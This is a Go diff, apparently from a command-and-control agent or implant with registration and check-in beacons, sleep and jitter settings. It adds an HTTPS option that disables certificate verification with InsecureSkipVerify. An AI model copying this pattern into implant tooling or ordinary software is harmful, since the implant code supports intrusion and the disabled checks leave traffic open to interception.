@@ -2,8 +2,10 @@ package main
 
 import (
 	"bytes"
+	"crypto/tls"
 	"encoding/binary"
 	"encoding/json"
+
 	//"fmt"
 	"io/ioutil"
 	"math/rand"
@@ -26,6 +28,7 @@ import (
 var (
 	c = utils.GetConfig()
 	url = c.Url
+	secure = c.IsSecure
 	userAgent = c.UserAgent
 	sleepTime = c.SleepTime
 	jitterRange = c.JitterRange
@@ -101,7 +104,17 @@ func registerAgent(url string, magic []byte, agentId string) string{
 	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
 	req.Header.Set("Content-Length", strconv.Itoa(size))
 
-	client := &http.Client{}
+	var client *http.Client
+	if secure {
+		tr := &http.Transport{
+			// TODO: Verify certificate once we figure out how to do that
+			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+		}
+		client = &http.Client{Transport: tr}
+	} else {
+		client = &http.Client{}
+	}
+
     res, err := client.Do(req)
 	if (err != nil){
 		return "failed"
@@ -140,7 +153,17 @@ func checkIn(dat string, checkInType string) string{
 	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
 	req.Header.Set("Content-Length", strconv.Itoa(size))
 
-	client := &http.Client{}
+	var client *http.Client
+	if secure {
+		tr := &http.Transport{
+			// TODO: Verify certificate once we figure out how to do that
+			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+		}
+		client = &http.Client{Transport: tr}
+	} else {
+		client = &http.Client{}
+	}
+
     res, err := client.Do(req)
     if os.IsTimeout(err){
 		timeoutCounter += 1
